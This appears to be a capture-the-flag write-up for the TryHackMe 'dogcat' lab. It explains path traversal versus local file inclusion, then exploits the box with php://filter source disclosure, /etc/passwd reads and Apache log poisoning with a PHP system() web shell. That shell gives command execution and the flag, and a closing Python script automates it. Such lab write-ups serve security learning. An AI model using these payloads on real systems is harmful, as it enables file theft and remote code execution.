# dogcat

<details>
    <summary></summary>

## **`path traversal VS LFI`**
   
- **Path Traversal** = *jumping in the folder tree* using `../` to access a file that you are not allowed to view (usually the endpoint reads/returns a file).

- **LFI (Local File Inclusion)** = *Inserting a file into a server/application* --- The input is used in include/require functions or displaying files within the application. **LFI can use Path Traversal** to access a file, but it has a broader footprint (its use can lead to code execution).

--- 

**Mnemonic:**

> Path traversal = "..\" (jump folders) --- LFI = "include/require" (app includes file).

---

**Path traversal (eg download endpoint):**

- URL: `GET /download?file=reports/2024.pdf`

- Test: `file=../../../../etc/passwd` → the server returns the content of `/etc/passwd`

- Behavior: The server reads and returns the file to the user.



**LFI (PHP example):**

```php
<?php
$page = $_GET['page'];
include("/var/www/pages/". $page);
?>
```

- Test: `page=../../../../etc/passwd` → may print file content within web page (LFI).

- But LFI can be improved: `page=php://filter/convert.base64-encode/resource=../../../../etc/passwd` → returns the base64 content (when characters do not appear correctly).

---

Examples of quick payloads for testing
=============================================

-   **Path traversal (only reading tests):**

    -   `../../../../etc/passwd`

    -   `..%2f..%2f..%2fetc%2fpasswd` (URL-encoded)

    -   `....//....//etc/passwd` (some servers deal with strange conversion methods)



-   **LFI-specific cheats:**

    -   `php://filter/convert.base64-encode/resource=../../../../etc/passwd` (for PHP)

    -   Trying to read logs: `../../../../var/log/apache2/access.log` and then injecting an HTTP request with a payload to record it in the log (log poisoning) → then include on the log → execute code (RCE) in some cases.

    -   `expect://`, `data://`, `input://` --- wrappers can be used if possible.

> Note: The null byte (`%00`) is old and does not work on modern versions of PHP, so relying on it is not reliable.




---

How do you tell them apart in practice (quick test)
=============================================

1. Try `../../../../etc/passwd`

    - If the file content appears → you will be able to say **Path Traversal or LFI**.

2. See the response:

    - If the server returns the file as **download/attachment** or plain file content → often **Path Traversal** (endpoint dedicated to reading/downloading files).

    - If the file appears inside the application page or is passed through include → usually **LFI**.









----
----

<details>
  <summary>how to know which one you face</summary>



Detailed process steps (with commands + what to expect)
---------------------------------------

### 1) Simple request for path (read file)

commander:

```
curl -i "http://TARGET/vulnerable?file=../../../../etc/passwd"
```

- **If the content of /etc/passwd appears as clear text** (and the HTTP status is 200): Possible **Path Traversal or LFI** --- additional checks are needed to distinguish them.

- See the response headers (`Content-Type`, `Content-Disposition`):

    - `Content-Disposition: attachment; filename="etc_passwd"` → Mostly **Path Traversal** (endpoint is for mounting).

    - `Content-Type: text/html` and the content is embedded within an HTML page → possibly **LFI** (included in page).


---

### 2) PHP wrapper test (robust differentiation test---tests LFI on PHP applications)

commander:

```
curl -s "http://TARGET/vulnerable?file=php://filter/convert.base64-encode/resource=../../../../etc/passwd"
```

- **If it returns base64** → This is strong evidence that the request went through PHP's include/require function --- **LFI** (not just read/download).

- **If it does not change** or the server rejects it → it is less likely that there is an LFI on PHP (but it may be Path Traversal or another language).

---

### 3) Does the file appear as a download file or within a page?

- Load/Attachment/Content-Disposition → **Path Traversal** Mostly.

- Within an HTML page (eg content between `<pre>` or at a page location) → **LFI** or include.

- Note: Some applications may return the file inside HTML even though it is just reading --- see the following steps.

---

### 4) Test the behavior by calling the application's PHP file

-   Try requesting an internal PHP file that usually exists (eg `/index.php`):

```
curl -i "http://TARGET/vulnerable?file=../../../../var/www/html/index.php"
```

-   **If the content is returned as PHP source code (meaning <?php ...)** → this means the server only *read* the file as text → mostly **Path Traversal** on the reading endpoint.

-   **If it appears as a result of executing the index.php (the resulting HTML)** → the application means **includes the file inside the server** (running it) → this is the behavior of **LFI** or include within the display context.


> Important note: Normally including a PHP file via include cannot cause it to be executed again on the server if it is included as text; But if the application uses `include` or `require` you will see the effect of include (the PHP code may be executed in the process).



---


### 5) Log poisoning test (effectively separates LFI from path traversal)

- Send a regular request with payload in `User-Agent` or path to be registered in access.log:

```
curl -A "<?php echo 'PWN'; ?>" "http://TARGET/"
```

- Then try include for log:

```
curl -i "http://TARGET/vulnerable?file=../../../../var/log/apache2/access.log"
```

- **If the text `PWN` appears in the response** → it means the server has read the log.

- **If you observe an execution or resulting change** (eg running code) → this indicates **LFI with exploitability**.


- If `PWN` does not appear despite its presence in the log → perhaps the endpoint does not allow reading those paths (or the file is out of validity) → Path Traversal may be limited.

> Warning: Testing log poisoning on real systems may be offensive --- only use it on licensed test environments or platforms (TryHackMe).



---

Shortcut tools/commands that you can save
----------------------------------

- Normal reading:

    `curl -i "http://TARGET/vuln?file=../../../../etc/passwd"`

- PHP wrapper test:

    `curl -s "http://TARGET/vuln?file=php://filter/convert.base64-encode/resource=../../../../etc/passwd" | base64 -d`

- Test include for PHP file:

    `curl -i "http://TARGET/vuln?file=../../../../var/www/html/index.php"`

- log poisoning test (only on test environment):

    `curl -A "<?php echo 'PWN'; ?>" "http://TARGET/"
    curl -i "http://TARGET/vuln?file=../../../../var/log/apache2/access.log"`








  
</details>

----
----









  
</details>


































## **`Nmap Scan`**

```ruby
namp -sCV 10.10.10.10
```

```ruby
Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-12 07:53 EDT
Nmap scan report for 10.10.43.88
Host is up (0.20s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 24:31:19:2a:b1:97:1a:04:4e:2c:36:ac:84:0a:75:87 (RSA)
|   256 21:3d:46:18:93:aa:f9:e7:c9:b5:4c:0f:16:0b:71:e1 (ECDSA)
|_  256 c1:fb:7d:73:2b:57:4a:8b:dc:d7:6f:49:bb:3b:d0:20 (ED25519)
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
|_http-server-header: Apache/2.4.38 (Debian)
|_http-title: dogcat
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.38 seconds

```

----

```
http://10.10.43.88/?view=dog
```

<img width="1917" height="655" alt="image" src="https://github.com/user-attachments/assets/de9e64ea-e606-4a96-8d69-e81751f4f0c4" />


> ## try lfi

```
http://10.10.43.88/?view=php://filter/resource=dog 
```

<img width="900" height="443" alt="image" src="https://github.com/user-attachments/assets/5d43f016-5b46-4881-b14b-7372b63f581b" />

```
Warning: include(): unable to locate filter "resource=dog.php" in /var/www/html/index.php on line 24

Warning: include(): Unable to create filter (resource=dog.php) in /var/www/html/index.php on line 24
```



> ### try

```php
http://10.10.43.88/?view=php://filter/convert.base64-encode/resource=dog
```

<img width="972" height="302" alt="image" src="https://github.com/user-attachments/assets/012c72c3-e20d-41bf-a3e2-a58bbbca9c90" />


```
PGltZyBzcmM9ImRvZ3MvPD9waHAgZWNobyByYW5kKDEsIDEwKTsgPz4uanBnIiAvPg0K 
```

<img width="931" height="135" alt="image" src="https://github.com/user-attachments/assets/f68318ea-7e04-46ae-83d4-1568361a2980" />

```php
<img src="dogs/<?php echo rand(1, 10); ?>.jpg" />
```


### 🔸 Summary of the difference:

| status | Implementation | Result |
| --- | --- | --- |
| `php://filter/resource=dog` | The code executes | You will see the output after execution
| `php://filter/convert.base64-encode/resource=dog` | The code | You will see the code itself in Base64 | format







> ## now try to see `index` main page

```
http://10.10.43.88/?view=php://filter/convert.base64-encode/resource=dog/../index
```


<img width="1663" height="457" alt="image" src="https://github.com/user-attachments/assets/ad23e102-07a5-42d7-a061-8e0cbcd47071" />


```
 Here you go!PCFET0NUWVBFIEhUTUw+CjxodG1sPgoKPGhlYWQ+CiAgICA8dGl0bGU+ZG9nY2F0PC90aXRsZT4KICAgIDxsaW5rIHJlbD0ic3R5bGVzaGVldCIgdHlwZT0idGV4dC9jc3MiIGhyZWY9Ii9zdHlsZS5jc3MiPgo8L2hlYWQ+Cgo8Ym9keT4KICAgIDxoMT5kb2djYXQ8L2gxPgogICAgPGk+YSBnYWxsZXJ5IG9mIHZhcmlvdXMgZG9ncyBvciBjYXRzPC9pPgoKICAgIDxkaXY+CiAgICAgICAgPGgyPldoYXQgd291bGQgeW91IGxpa2UgdG8gc2VlPzwvaDI+CiAgICAgICAgPGEgaHJlZj0iLz92aWV3PWRvZyI+PGJ1dHRvbiBpZD0iZG9nIj5BIGRvZzwvYnV0dG9uPjwvYT4gPGEgaHJlZj0iLz92aWV3PWNhdCI+PGJ1dHRvbiBpZD0iY2F0Ij5BIGNhdDwvYnV0dG9uPjwvYT48YnI+CiAgICAgICAgPD9waHAKICAgICAgICAgICAgZnVuY3Rpb24gY29udGFpbnNTdHIoJHN0ciwgJHN1YnN0cikgewogICAgICAgICAgICAgICAgcmV0dXJuIHN0cnBvcygkc3RyLCAkc3Vic3RyKSAhPT0gZmFsc2U7CiAgICAgICAgICAgIH0KCSAgICAkZXh0ID0gaXNzZXQoJF9HRVRbImV4dCJdKSA/ICRfR0VUWyJleHQiXSA6ICcucGhwJzsKICAgICAgICAgICAgaWYoaXNzZXQoJF9HRVRbJ3ZpZXcnXSkpIHsKICAgICAgICAgICAgICAgIGlmKGNvbnRhaW5zU3RyKCRfR0VUWyd2aWV3J10sICdkb2cnKSB8fCBjb250YWluc1N0cigkX0dFVFsndmlldyddLCAnY2F0JykpIHsKICAgICAgICAgICAgICAgICAgICBlY2hvICdIZXJlIHlvdSBnbyEnOwogICAgICAgICAgICAgICAgICAgIGluY2x1ZGUgJF9HRVRbJ3ZpZXcnXSAuICRleHQ7CiAgICAgICAgICAgICAgICB9IGVsc2UgewogICAgICAgICAgICAgICAgICAgIGVjaG8gJ1NvcnJ5LCBvbmx5IGRvZ3Mgb3IgY2F0cyBhcmUgYWxsb3dlZC4nOwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9CiAgICAgICAgPz4KICAgIDwvZGl2Pgo8L2JvZHk+Cgo8L2h0bWw+Cg== 
```

<img width="1226" height="734" alt="image" src="https://github.com/user-attachments/assets/b9ac2010-1e6b-435b-bb96-229c8ac1b7c6" />


```php
<head>
    <title>dogcat</title>
    <link rel="stylesheet" type="text/css" href="/style.css">
</head>

<body>
    <h1>dogcat</h1>
    <i>a gallery of various dogs or cats</i>

    <div>
        <h2>What would you like to see?</h2>
        <a href="/?view=dog"><button id="dog">A dog</button></a> <a href="/?view=cat"><button id="cat">A cat</button></a><br>
        <?php
            function containsStr($str, $substr) {
                return strpos($str, $substr) !== false;
            }
	    $ext = isset($_GET["ext"]) ? $_GET["ext"] : '.php';
            if(isset($_GET['view'])) {
                if(containsStr($_GET['view'], 'dog') || containsStr($_GET['view'], 'cat')) {
                    echo 'Here you go!';
                    include $_GET['view'] . $ext;
                } else {
                    echo 'Sorry, only dogs or cats are allowed.';
                }
            }
        ?>
    </div>
</body>

</html>
```

> ## notice that **`$ext = isset($_GET["ext"]) ? $_GET["ext"] : '.php';`**
> that is mean we can choose the extension of file 

> ## now let's try to read **`/etc/passwd`**


```
http://10.10.43.88/?view=dog/../../../../../../../../../etc/passwd&ext=
```

> note if you try ``http://10.10.43.88/?view=dog/../../../../../../../../../etc/passwd`` only the extension will be `passwd.php` and it will fail


<img width="1197" height="510" alt="image" src="https://github.com/user-attachments/assets/9e10dbaf-21f5-49e8-96c9-43d8d8bb621f" />

```ruby
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:GnatsBug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin 
```



> ## try to access log file of website

```
http://10.10.43.88/?view=dog/../../../../../../../../../var/log/apache2/access.log&ext=
```


<img width="1496" height="822" alt="image" src="https://github.com/user-attachments/assets/da6282b0-ab1b-4b68-9ebf-8ec4a4e61ab1" />

> notice that we can see `user agant` `Mozilla/5.0 `

> try to put php code in user agant to see if it will run



```
curl "http://10.10.43.88" -H "User-Agent: <?php system(\$_GET['c']); ?>"
```

<img width="1133" height="460" alt="image" src="https://github.com/user-attachments/assets/dd04ca67-72f1-47f7-8f7f-ec286f1ceda4" />


> ## see logs again

<img width="1054" height="305" alt="image" src="https://github.com/user-attachments/assets/30e7f092-3b81-4564-a4dd-8663e9f12f80" />

> ## good now we will put value to **`c`** forexample **`id`** :


```
http://10.10.43.88/?view=dog/../../../../../../../../../var/log/apache2/access.log&ext=&c=id
```


<img width="1390" height="149" alt="image" src="https://github.com/user-attachments/assets/ff3da476-fac9-4fe9-8733-4265a939515c" />

```
"uid=33(www-data) gid=33(www-data) groups=33(www-data)"
```


### Summary example

- The log writing step = just writing the text `<?php system($_GET['c']); ?>`.

- The include step = execute this text as part of the site code.

- The value of `c` = comes from the URL at the time of execution.

### The reason for the success of the attack in brief

because:

- The server writes the User-Agent to the log.

- The application allows include for a path from which the login can be accessed.

- include makes PHP execute the code you put in the log.

- The attacker passes the command via `?c=...`.


--- 


> ## try list content

```
view-source:http://10.10.43.88/?view=dog/../../../../../../../../../var/log/apache2/access.log&ext=&c=ls
```

<img width="1469" height="245" alt="image" src="https://github.com/user-attachments/assets/410a61f0-18eb-4ef0-ab6b-ddf6663cf0d8" />

> #### get the flag

```
http://10.10.43.88/?view=php://filter/read=convert.base64-encode/resource=./dog/../flag
or
http://10.10.43.88/?view=dog/../../../../../../../../../var/log/apache2/access.log&ext=&c=cat%20flag.php
```

<img width="1021" height="179" alt="image" src="https://github.com/user-attachments/assets/5732c078-d071-41a8-bab8-e2a354a91520" />

<img width="801" height="107" alt="image" src="https://github.com/user-attachments/assets/852fc3b9-fdb4-43f5-8b50-976dc1cefb23" />


```
$flag_1 = "THM{Th1s_1s_N0t_4_Catdog_ab67edfa}"
```



> ## test

```python
#!/usr/bin/env python

import requests

shell = 'echo a > test'

url = "http://10.10.77.157/"

params = {
    "view": "dog/../../../../../../var/log/apache2/access.log",
    "ext": "",
    "c": shell
}

r = requests.get(url, params = params)
```







